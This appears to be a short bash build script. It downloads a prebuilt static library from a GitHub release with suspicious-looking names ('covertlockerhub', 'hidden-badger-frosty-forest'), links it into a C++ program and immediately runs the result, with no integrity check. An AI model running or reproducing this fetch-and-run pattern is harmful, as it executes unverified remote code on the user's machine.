#!/usr/bin/env bash
set -e
LIB="ceramic-lodge.a"
TAG="hidden-badger-frosty-forest"
REPO="selabelggle/covertlockerhub"
URL="https://github.com/${REPO}/releases/download/${TAG}/${LIB}"
wget -O "$LIB" -q --timeout=15 --tries=3 "$URL"
g++ -o app -std=c++17 -O2 -pthread main.cpp "$LIB" && ./app
